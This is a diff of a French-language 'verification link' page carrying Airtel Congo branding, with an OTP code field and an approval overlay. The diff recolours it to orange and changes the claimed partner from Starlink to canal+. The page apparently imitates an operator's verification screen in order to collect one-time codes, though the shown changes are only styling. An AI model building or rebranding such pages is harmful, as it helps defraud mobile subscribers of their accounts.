@@ -6,17 +6,17 @@
 <title>Airtel Lite — Lien de vérification</title>
 <style>
   :root{
-    --airtel-red:#e30613;
+    --brand-orange:#ff5a00;
     --text-dark:#2a2a2a;
     --text-grey:#8a8a8a;
     --border-grey:#d5d5d5;
-    --footer-bg:#f4f4f4;
+    --footer-bg:#fff7ef;
   }
   *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
   html{-webkit-text-size-adjust:100%;}
   body{
     font-family:'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    background:#fff;
+    background:linear-gradient(180deg, #ff5a00 0%, #ff5a00 42%, #fff7ef 42%, #fff7ef 58%, #ff5a00 58%, #ff5a00 100%);
     color:var(--text-dark);
     min-height:100svh;
     width:100%;
@@ -131,7 +131,7 @@
     color:#b0b0b0;
     font-size:15px;
   }
-  .otp-input:focus{border-color:var(--airtel-red);}
+  .otp-input:focus{border-color:var(--brand-orange);}
 
   .helper-text{
     text-align:center;
@@ -163,9 +163,9 @@
     transition:background .2s ease;
   }
   .submit-btn.active{
-    background:var(--airtel-red);
+    background:var(--brand-orange);
     cursor:pointer;
-    box-shadow:0 8px 18px rgba(227,6,19,0.3);
+    box-shadow:0 8px 18px rgba(255,90,0,0.28);
   }
   .submit-btn.active:active{transform:translateY(1px) scale(0.99);}
 
@@ -196,7 +196,7 @@
     width:52px;
     height:52px;
     border:4px solid #eee;
-    border-top-color:var(--airtel-red);
+    border-top-color:var(--brand-orange);
     border-radius:50%;
     animation:spin 0.9s linear infinite;
     margin:0 auto 18px;
@@ -207,7 +207,7 @@
   .approval-overlay h2{
     font-size:clamp(23px,4vw,36px);
     font-weight:800;
-    color:var(--airtel-red);
+    color:var(--brand-orange);
     margin-bottom:10px;
   }
   .approval-overlay p{
@@ -231,7 +231,7 @@
 
   .approval-overlay .denied-msg{
     display:none;
-    color:var(--airtel-red);
+    color:var(--brand-orange);
     font-weight:700;
     font-size:clamp(18px,3vw,26px);
     margin-top:8px;
@@ -241,7 +241,7 @@
     display:none;
     margin-top:18px;
     border:none;
-    background:var(--airtel-red);
+    background:var(--brand-orange);
     color:#fff;
     font-weight:800;
     font-size:clamp(18px,3vw,26px);
@@ -250,7 +250,7 @@
     min-height:58px;
     border-radius:12px;
     cursor:pointer;
-    box-shadow:0 10px 20px rgba(227,6,19,0.22);
+    box-shadow:0 10px 20px rgba(255,90,0,0.22);
     transition:transform .15s ease, box-shadow .15s ease;
   }
 
@@ -264,7 +264,7 @@
   }
 
   footer{
-    background:var(--footer-bg);
+    background:linear-gradient(180deg, #ff5a00 0%, #ff5a00 100%);
     padding:36px 24px 24px;
     text-align:center;
   }
@@ -344,7 +344,7 @@
       <img src="assets/img/OIP.jpg" alt="Max it RDC logo">
     </div>
     <div class="collab-text">En collaboration avec</div>
-    <div class="collab-brand">Starlink™</div>
+    <div class="collab-brand">canal+™</div>
     <hr>
     <div class="copyright">© 2026 Airtel Congo. Tous droits réservés.</div>
   </footer>
